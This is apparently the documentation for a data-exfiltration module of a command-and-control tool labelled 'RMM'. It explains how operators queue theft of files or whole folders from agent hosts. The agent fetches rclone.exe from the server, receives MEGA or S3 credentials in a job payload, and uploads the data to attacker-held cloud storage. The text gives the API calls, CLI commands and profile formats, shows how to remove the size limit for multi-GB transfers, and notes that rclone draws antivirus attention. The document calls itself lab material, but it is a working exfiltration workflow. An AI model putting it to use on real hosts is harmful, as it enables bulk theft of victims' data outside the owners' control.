# rclone exfil

Operators queue exfil of a **remote file or folder on the agent** to cloud storage (MEGA, S3, …) using **rclone on the agent host**. The server holds the rclone binary and named remote profiles; credentials are sent to the agent only inside the ephemeral `__EXFIL__` job payload.

## Flow

1. Operator queues via REST, CLI, MCP, or web UI (`exfil`).
2. Server enqueues `__EXFIL__` with JSON: local path, profile name, destination, and `RCLONE_CONFIG_*` env vars.
3. Agent downloads `rclone.exe` from the server once (beacon auth) into `%LOCALAPPDATA%\RMM\rclone.exe` if missing.
4. Agent runs **`rclone copyto`** (single file) or **`rclone copy`** (directory tree) and optional `rclone link` for MEGA files.
5. Agent POSTs `cloud_upload` result; transcript shows `remote_path → link` or destination path.

### Files vs folders

The agent detects the path type on the host:

| Local path on agent | rclone command | Default cloud dest (no `dest`) |
|---------------------|----------------|--------------------------------|
| File | `copyto` | `{profile.folder}/{basename}` |
| Directory | `copy` (recursive) | `{profile.folder}/{folder-basename}` |

Use the same operator commands for both — `exfil C:\Users\x\Documents\project mega-lab` uploads the whole tree.

- **`RMM_RCLONE_MAX_BYTES`** applies to the **total** size (file length or sum of all files in the folder).
- MEGA **`link`** is generated for single-file exfil only (not folders).
- Optional **`dest`** overrides the remote path prefix (e.g. `"dest": "archives/project-backup"`).

During upload the agent also POSTs **`exfil_progress`** updates (bytes, percent, speed, ETA) roughly every 5s or 1% change. The web UI shows a live progress bar; progress events are **WebSocket-only** (not stored in session history).

Traffic exits the **agent network**, not the RMM server.

## Server setup

### 1. rclone binary

Place Windows **amd64** `rclone.exe` in `tools/rclone/` or set:

```bash
export RMM_RCLONE_BIN=/path/to/rclone.exe
```

Agents fetch: `GET /tools/rclone.exe?id=<session_id>` (beacon token required).

### 2. Remote profiles

Define named profiles as JSON:

| Variable | Purpose |
|----------|---------|
| `RMM_RCLONE_PROFILES` | Inline JSON object of profiles |
| `RMM_RCLONE_PROFILES_FILE` | Path to a JSON file (overrides inline if both set) |
| `server_rmm.py --rclone-profiles PATH` | Same as `RMM_RCLONE_PROFILES_FILE` at startup |
| `RMM_RCLONE_DEFAULT_PROFILE` | Default profile when `--profile` omitted (default `mega-lab`) |
| `RMM_RCLONE_MAX_BYTES` | Max exfil size in bytes (file or whole folder; default 100 MB); **`0` = unlimited** |
| `server_rmm.py --rclone-max-bytes N` | Same as `RMM_RCLONE_MAX_BYTES` at startup |

Example file (`tools/rclone/profiles.example.json`):

```json
{
  "mega-lab": {
    "type": "mega",
    "user": "lab@example.com",
    "pass": "secret",
    "folder": "RMM",
    "description": "Lab MEGA account"
  },
  "s3-lab": {
    "type": "s3",
    "provider": "AWS",
    "access_key_id": "AKIA...",
    "secret_access_key": "...",
    "region": "us-east-1",
    "folder": "rmm-uploads"
  }
}
```

Copy credentials into your lab config; do not commit real secrets.

For MEGA (and other remotes using `pass`), put the **plain** password in JSON. The agent runs `rclone obscure` before upload. If you pre-obscured with `rclone obscure`, set `"pass_obscured": true` on that profile.

**Large files:** default cap is 100 MB. For multi-GB exfil (e.g. a 6.6 GB ISO), raise the limit and restart the server:

```bash
python server_rmm.py --rclone-max-bytes 0   # unlimited
# or: export RMM_RCLONE_MAX_BYTES=7000000000   # ~6.5 GB for one file
```

Then queue exfil again (new jobs pick up the updated limit). Check your cloud backend quota (MEGA free tier may block very large uploads).

### Troubleshooting failed exfil

| Symptom | Likely cause |
|---------|----------------|
| `exceeds exfil limit` | Default **100 MB** cap — set `RMM_RCLONE_MAX_BYTES=0` or `--rclone-max-bytes 0` on the server |
| `rclone copyto failed (exit ?)` with stats JSON only | rclone exited before transfer; read the **error** line in the message (agent now parses JSON log `level=error`) |
| `0 B / 0 B` in log tail | Often auth/config or remote path — verify MEGA credentials in profiles and folder name |
| Large ISO (~6 GB+) | Raise server size cap **and** confirm cloud storage quota (MEGA free accounts may reject multi-GB files) |

The web UI **Exfil** hint shows the current per-file cap from `GET /api/v1/rclone/config` (`max_bytes`).

Start the server with profiles:

```bash
python server_rmm.py --rclone-profiles /path/to/profiles.json
# or
export RMM_RCLONE_PROFILES_FILE="/path/to/profiles.json"
python server_rmm.py
```

Check status:

```bash
rmm_cli.py rclone-config
# or
curl -s -H "Authorization: Bearer $RMM_API_TOKEN" http://127.0.0.1:8080/api/v1/rclone/config
```

## Operator API

```http
POST /api/v1/sessions/{id}/exfil
Authorization: Bearer <RMM_API_TOKEN>
Content-Type: application/json

{"remote_path": "C:\\Users\\x\\doc.pdf", "profile": "mega-lab", "dest": "optional/path/file.pdf"}
```

Folder example:

```json
{"remote_path": "C:\\Users\\x\\project", "profile": "mega-lab"}
```

Uploads the directory recursively to `{profile.folder}/project/` on the remote.

```http
GET /api/v1/rclone/config
```

## CLI and MCP

- `rmm_cli.py exfil <remote_path> [--profile NAME] [--dest PATH]`
- `rmm_cli.py rclone-config [--json]`
- MCP: `queue_exfil`, `get_rclone_config`
- Web UI: profile dropdown populated from `GET /rclone/config` (type + folder label)

## Result event

`type`: `cloud_upload`

```json
{
  "remote_path": "C:\\Users\\x\\doc.pdf",
  "profile": "mega-lab",
  "backend": "mega",
  "dest": "RMM/doc.pdf",
  "success": true,
  "link": "https://mega.nz/#!…",
  "size": 12345,
  "path_kind": "file",
  "error": null
}
```

`path_kind` is `file` or `dir` (agent-side).

### Progress (live only)

While `rclone copy` / `rclone copyto` runs, the agent POSTs `type=exfil_progress`:

```http
POST /result?id=<session>&type=exfil_progress
```

```json
{
  "remote_path": "C:\\Users\\x\\doc.pdf",
  "profile": "mega-lab",
  "bytes": 104857600,
  "total_bytes": 6666666666,
  "percent": 1.6,
  "speed_bps": 12500000,
  "eta_seconds": 520
}
```

The server broadcasts these on the operator WebSocket (`exfil_progress` events). The web UI renders a **progress bar** (same component as agent downloads) under the queued exfil command. Progress is **not** appended to `events.jsonl` (avoids transcript spam on multi-GB uploads).

When rclone JSON stats omit `totalBytes`, the agent falls back to the source file or folder total size from the exfil job so progress updates are not skipped.

## Security (lab)

- Credentials travel in the beacon command queue (HTTPS); they are not stored in `client_rmm.ps1`.
- rclone env vars are cleared after each job on the agent.
- Use dedicated lab cloud accounts with limited quota.
- rclone is a known living-off-the-land binary; expect AV interest outside lab VMs.

## Related code

| File | Role |
|------|------|
| `rmm_rclone.py` | Profiles, env builder, exfil payload |
| `server_rmm.py` | `queue_agent_exfil`, `/tools/rclone.exe`, `cloud_upload` handler |
| `client_rmm.ps1` | Bootstrap, `Invoke-RmmRcloneExfil` |
| `tools/rclone/` | Binary + example profiles |

## Module reference (`rmm_rclone.py`)

| Symbol | Role |
|--------|------|
| `load_profiles()` | Read profiles from env/file |
| `get_profile(name)` | Resolve named profile |
| `profile_to_rclone_env(profile)` | Build `RCLONE_CONFIG_RMM_*` dict |
| `build_exfil_command(...)` | Full `__EXFIL__` command string |
| `rclone_public_config()` | Operator-safe status dict |
